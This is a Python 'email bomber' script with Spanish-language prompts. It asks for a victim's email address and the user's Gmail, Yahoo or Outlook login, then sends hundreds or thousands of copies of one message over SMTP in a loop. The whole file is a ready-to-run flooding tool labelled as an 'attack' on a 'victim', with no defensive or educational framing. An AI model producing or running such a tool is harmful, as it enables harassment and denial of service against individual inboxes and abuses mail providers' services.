import smtplib
import sys
from colorama import Fore,Back,Style

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def banner():

    print(bcolors.RED + '''
             . . .                         
              \|/                          
            `--+--'                        
              /|\                          
             ' | '                         
               |                           
               |                           
           ,--'#`--.                       
           |#######|                       
        _.-'#######`-._                    
     ,-'###############`-.                 
   ,'#####################`,               
  /#########################\              
 |###########################|             
|#############################|            
|#############################|            
|#############################|            
|#############################|            
 |###########################|             
  \#########################/              
   `.#####################,'               
     `._###############_,'                 
        `--..#####..--'
                 
███████╗███╗   ███╗ █████╗ ██╗██╗                   
██╔════╝████╗ ████║██╔══██╗██║██║                   
█████╗  ██╔████╔██║███████║██║██║                   
██╔══╝  ██║╚██╔╝██║██╔══██║██║██║                   
███████╗██║ ╚═╝ ██║██║  ██║██║███████╗              
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝              
                                                    
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                   
                                                     ''')


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + 'Iniciando Programa....')
            self.target = str(input(bcolors.GREEN + 'Ingresa el correo de la victima <: '))
            self.mode = int(
                input(bcolors.GREEN + 'Ingresa la cantidad de mensajes que se enviaran (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Opcion invalida. Adios :(.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + 'Configurando... ')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Ingresa una cantidad :D <: '))
            print(bcolors.RED + f'Tu opcion fue: {self.mode} y {self.amount} mensajes ')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + 'Configuración del correo electrónico')
            self.server = str(
                input(bcolors.GREEN + 'Ingresa una opcion - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Ingresa el numero del puerto <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Ingresa tu correo <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Ingresa tu contraseña <: '))
            self.subject = str(input(bcolors.GREEN + 'Ingresa el "Asunto" <: '))
            self.message = str(input(bcolors.GREEN + 'Ingresa el mensaje <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'Mensaje enviado correctamente: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + 'Atacando...')
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(bcolors.RED + 'Ataque Terminado :D ')
        sys.exit(0)


if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
